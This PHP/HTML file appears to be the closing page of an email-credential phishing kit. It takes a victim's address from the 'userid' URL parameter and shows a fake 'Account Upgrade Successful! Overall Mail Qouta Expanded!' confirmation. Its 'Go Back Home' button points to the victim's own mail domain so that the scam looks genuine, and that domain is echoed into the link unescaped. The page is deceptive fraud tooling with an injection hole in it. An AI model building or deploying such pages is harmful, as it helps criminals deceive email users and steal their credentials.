<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['userid'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
// for($i=0; $i<$ln; $i++){
// 	if($yuh[$i] == "."){
// 		$x = $i;
// 		break;
// 	}
// }
// $yuh = substr($yuh,0,$x);

?>

<!DOCTYPE html>
<html
  class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch no-geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"
>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <title>Account Upgrade Successful!</title>
    <!-- Required meta tags always come first -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <!--
      <link
        href="http://faithgabriel.com/images/favicon/favicon-32.png"
        rel="shortcut icon"
        type="image/png"
      />
    -->
    <link rel="stylesheet" href="successs_files/main.css" />
    <link href="successs_files/css.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="successs_files/font-awesome.css" />
  </head>

  <body>
    <div id="wrapper">
      <header></header>
      <div id="success-bg">
        <div class="success-container">
          <div class="success-content">
            <i
              data-wow-delay="0.2s"
              class="fa fa-check-circle wow fadeInUp animated"
              style="visibility: visible; animation-delay: 0.2s; animation-name: fadeInUp;"
            ></i>
            <h1
              data-wow-delay="0.4s"
              class="slate wow fadeInUp animated"
              style="visibility: visible; animation-delay: 0.4s; animation-name: fadeInUp;"
            >
              SUCCESS
            </h1>
            <p
              data-wow-delay="0.6s"
              class="statement wow fadeInUp animated"
              style="visibility: visible; animation-delay: 0.6s; animation-name: fadeInUp;"
            >
              Your account has been Upgraded! Overall Mail Qouta Expanded!
            </p>
            <a
              data-wow-delay="0.8s"
              href="<?php echo 'http://www.'.$yuh ?>"
              class="button button-primary wow fadeInUp animated"
              style="visibility: visible; animation-delay: 0.8s; animation-name: fadeInUp;"
              >Go Back Home</a
            >
          </div>
        </div>
      </div>
    </div>
    <script src="successs_files/modernizr.js"></script>
    <script src="successs_files/jquery-1.js"></script>
    <script src="successs_files/jquery-1_002.js"></script>
    <script src="successs_files/jquery.js"></script>
    <script src="successs_files/jquery_002.js"></script>
    <script src="successs_files/custom.js"></script>
    <script src="successs_files/wow.js"></script>
    <script src="successs_files/velocity.js"></script>
    <script>
      new WOW().init();
    </script>
  </body>
</html>
